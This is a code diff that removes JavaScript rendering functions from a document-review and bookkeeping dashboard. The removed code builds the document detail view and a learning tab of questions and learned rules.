-      + " · " + esc(x.markdown_chars || 0) + " chars · " + esc(x.lifecycle) + "</div></div>"
-      + "<span class='kind'>" + esc(x.source) + "</span>"
-      + "<span class='dt'>" + esc(String(x.received_at || "").slice(0, 10)) + "</span></div>"
-    ).join("");
-  document.querySelectorAll("#docList .drow").forEach((el) =>
-    el.onclick = () => showDoc(el.dataset.id));
-}
-
-async function handleReviewAction(act, id) {
-  if (act === "confirm") {
-    const r = await apiPost("/v1/entities/confirm", { entity_id: id });
-    if (!r.error) loadReview();
-  } else if (act === "reprocess") {
-    const r = await apiPost("/v1/documents/" + encodeURIComponent(id) + "/reprocess", {});
-    if (!r.error) loadReview();
-  } else if (act === "link") {
-    // Open the document detail for review.
-    showDoc(id);
-  }
-}
-
-async function showDoc(id) {
-  const d = await api("/v1/documents/" + encodeURIComponent(id) + "/detail");
-  const doc = d.document || {};
-  const x = d.extraction || {};
-  const parties = d.parties || [];
-  const txns = d.transactions || [];
-  const eff = d.effective || {};
-
-  const partiesHtml = parties.map((p) =>
-    "<div class='rule'><span class='k'>" + esc(p.role) + "</span>"
-    + "<span class='v'>" + esc(p.display_name) + " <span style='color:var(--faint)'>· " + esc(p.kind) + " · " + esc(p.status) + "</span></span>"
-    + "</div>").join("");
-  const txnsHtml = txns.map((t) =>
-    "<div class='rule'><span class='k'>" + esc(t.direction) + "</span>"
-    + "<span class='v'>" + money(t.amount_minor) + " " + esc(t.currency || "")
-    + " · " + esc(t.counterparty_name || "transfer")
-    + " <span style='color:var(--faint)'>· " + esc(t.evidence_role) + " · " + esc(t.linked_by) + "</span></span>"
-    + "<span class='n'>" + esc(String(t.occurred_at || "").slice(0, 10)) + "</span></div>").join("");
-
-  const effRows = Object.entries(eff).filter(([, v]) => v && v.value !== null && v.value !== undefined).map(([k, v]) =>
-    "<div class='rule'><span class='k'>" + esc(k) + "</span>"
-    + "<span class='v'>" + esc(v.value) + " <span style='color:var(--faint)'>· " + esc(v.source) + "</span></span></div>"
-  ).join("");
-
-  const refIds = x.reference_ids ? Object.entries(x.reference_ids).map(([k, v]) =>
-    esc(k) + "=" + esc(v)).join("  ") : "";
-
-  document.getElementById("docDetail").innerHTML =
-    "<div class='panel'><h3>" + esc(doc.original_filename) + "</h3>"
-    + "<div class='grid3' style='margin-bottom:14px'>"
-    + "<div><div style='font:10.5px var(--mono);color:var(--faint);text-transform:uppercase'>Type</div>"
-    + "<div style='font:12px var(--mono);margin-top:3px'>" + esc(doc.doc_type || "—") + "</div></div>"
-    + "<div><div style='font:10.5px var(--mono);color:var(--faint);text-transform:uppercase'>Received</div>"
-    + "<div style='font:12px var(--mono);margin-top:3px'>" + esc(String(doc.received_at || "").slice(0, 19)) + "</div></div>"
-    + "<div><div style='font:10.5px var(--mono);color:var(--faint);text-transform:uppercase'>Lifecycle</div>"
-    + "<div style='font:12px var(--mono);margin-top:3px'>" + esc(doc.lifecycle) + "</div></div>"
-    + "</div>"
-    + (refIds ? "<h3>Reference IDs</h3><div style='font:11.5px var(--mono);color:var(--dim);margin-bottom:14px'>" + refIds + "</div>" : "")
-    + "<h3>Effective fields</h3>" + (effRows || "<div class='empty'>No extracted fields.</div>")
-    + "<h3 style='margin-top:18px'>Parties</h3>" + (partiesHtml || "<div class='empty'>No resolved parties.</div>")
-    + "<h3 style='margin-top:18px'>Transactions evidenced</h3>" + (txnsHtml || "<div class='empty'>Not linked to any transaction.</div>")
-    + "</div>";
-}
-
-// ════════════════════════════════════════════════════════════════════════
-// LEARNING TAB
-// ════════════════════════════════════════════════════════════════════════
-let learnEnabled = true;
-async function loadLearning() {
-  const l = await api("/v1/learning");
-  learnEnabled = l.enabled !== false;
-  document.getElementById("learnStatus").textContent =
-    "Learning is " + (learnEnabled ? "ON" : "OFF") + " · " + esc(l.answered || 0) + " questions answered";
-  document.getElementById("learnBudget").textContent = "Question budget: " + esc(l.budget);
-  const tBtn = document.getElementById("learnToggle");
-  tBtn.textContent = learnEnabled ? "Turn off" : "Turn on";
-  tBtn.onclick = async () => {
-    const r = await apiPost("/v1/learning/toggle", { enabled: !learnEnabled });
-    if (!r.error) loadLearning();
-  };
-
-  const qs = l.questions || [];
-  document.getElementById("qCount").textContent = "· " + qs.length + " open";
-  document.getElementById("qList").innerHTML = !qs.length
-    ? "<div class='empty'>No open questions.</div>"
-    : qs.map((q) => {
-      const opts = (q.options || []);
-      const optBtns = opts.map((o) =>
-        "<button class='a' data-qid='" + esc(q.id) + "' data-ans='" + esc(o) + "'>" + esc(o) + "</button>").join("");
-      const ctx = q.context ? (typeof q.context === "string" ? q.context : JSON.stringify(q.context, null, 1)) : "";
-      return "<div class='qcard' data-qid='" + esc(q.id) + "'>"
-        + "<div class='trig'>" + esc(q.trigger) + "</div>"
-        + "<div class='q'>" + esc(q.question) + "</div>"
-        + (ctx ? "<div class='ctx'>" + esc(ctx) + "</div>" : "")
-        + "<div class='opts'>" + optBtns
-        + "<button class='d' data-qid='" + esc(q.id) + "' data-dismiss='1'>Dismiss</button></div></div>";
-    }).join("");
-
-  document.querySelectorAll("#qList .a").forEach((b) => b.onclick = async () => {
-    const r = await apiPost("/v1/learning/answer", { review_id: Number(b.dataset.qid), answer: b.dataset.ans });
-    if (!r.error) loadLearning();
-  });
-  document.querySelectorAll("#qList .d").forEach((b) => b.onclick = async () => {
-    const r = await apiPost("/v1/learning/dismiss", { review_id: Number(b.dataset.qid) });
-    if (!r.error) loadLearning();
-  });
-
-  const rules = l.rules || [];
-  document.getElementById("rCount").textContent = "· " + rules.length + " active";
-  document.getElementById("rList").innerHTML = !rules.length
-    ? "<div class='empty'>No learned rules yet.</div>"
-    : rules.map((r) =>
-      "<div class='rule'><span class='k'>" + esc(r.kind) + "</span>"
-      + "<span class='v'>" + esc(r.match_key) + " → " + esc(r.value) + "</span>"
-      + "<span class='n'>applied " + esc(r.times_applied) + "×</span></div>"
-    ).join("");
-
-  const answered = l.answered_questions || [];
-  document.getElementById("aCount").textContent = "· " + answered.length + " answered";
-  document.getElementById("aList").innerHTML = !answered.length
-    ? "<div class='empty'>No answered questions yet.</div>"
-    : answered.map((a) =>
-      "<div class='rule'><span class='k'>" + esc(a.trigger) + "</span>"
-      + "<span class='v'>" + esc(a.question) + " → <b style='color:var(--ok)'>" + esc(a.answer) + "</b></span>"
-      + "<span class='n'>" + esc(String(a.answered_at || "").slice(0, 19)) + "</span></div>"
-    ).join("");
-}
 
 // ── init ─────────────────────────────────────────────────────────
 renderPeriods();
